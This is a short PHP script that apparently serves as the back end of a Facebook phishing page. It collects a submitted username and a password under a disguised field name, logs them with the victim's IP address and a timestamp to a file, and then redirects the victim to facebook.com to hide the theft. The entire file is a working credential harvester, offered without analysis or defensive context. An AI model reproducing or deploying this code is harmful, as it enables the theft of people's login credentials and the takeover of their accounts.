<?php
$file = "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx";
$saya = $_POST['user'];
$masuk = $_POST['lastname'];
$semua = $_SERVER['REMOTE_ADDR'];
$today = date("F j, Y, g:i a");

$handle = fopen($file, 'a');
fwrite($handle, "\n");
fwrite($handle, "MASUK____________________________ONE");
fwrite($handle, "\n");
fwrite($handle, "DATA     : ");
fwrite($handle, "$saya");
fwrite($handle, "\n");
fwrite($handle, "CODE     : ");
fwrite($handle, "$masuk");
fwrite($handle, "\n");
fwrite($handle, "Tanggal  : ");
fwrite($handle, "$today");
fwrite($handle, "\n");
fwrite($handle, "Ip       : ");
fwrite($handle, "$semua");
fwrite($handle, "\n");
fwrite($handle, "KELUAR___________________________ONE");
fclose($handle);
echo "<script LANGUAGE=\"JavaScript\">
<!--
window.location=\"https://facebook.com/\";
// -->
</script>";
?>